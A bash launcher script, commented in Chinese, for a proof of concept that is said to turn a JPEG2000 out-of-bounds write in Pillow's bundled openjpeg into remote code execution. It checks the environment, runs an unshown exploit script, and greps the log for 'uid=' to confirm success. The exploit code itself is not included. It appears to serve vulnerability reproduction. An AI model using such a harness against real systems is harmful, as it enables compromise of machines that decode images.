#!/bin/bash
# oneclick.sh —— 一键复现：JPEG2000 越界写 → RCE
#   环境：Pillow 12.3.0（vendored openjpeg 2.5.4）/ aarch64 Linux / 非 PIE 的 CPython
#   用法：bash oneclick.sh
D="$(cd "$(dirname "$0")" && pwd)"
LOG=/tmp/oneclick_last.log

echo "==================== 环境检查 ===================="
python3 -c "import PIL, sys; print('Python', sys.version.split()[0], '| Pillow', PIL.__version__)" 2>&1
readelf -h "$(readlink -f "$(which python3)")" 2>/dev/null | grep -E 'Class|Type' || echo "(读不到 readelf 信息，跳过)"

echo
echo "==================== 开始利用 ===================="
cd "$D" || exit 1
{ PYTHONSAFEPATH=1 timeout 200 python3 -u rce_blind.py >"$LOG" 2>&1; } 2>/dev/null   # 屏蔽 shell 自己打的崩溃提示
echo "（完整日志：$LOG）"
echo
echo "==================== 关键输出 ===================="
grep -aE '相邻对|解码完成|HIT|uid=' "$LOG" || true
echo
if grep -qa 'uid=' "$LOG"; then
    echo "✅ RCE 成立：命令由【图片解码过程】写坏内存后执行（上面 uid= 那行）"
else
    echo "⚠️ 本次未命中：堆布局有随机性，直接重跑本脚本；多次不中请按 REPRODUCE.md §5 校准旋钮"
fi
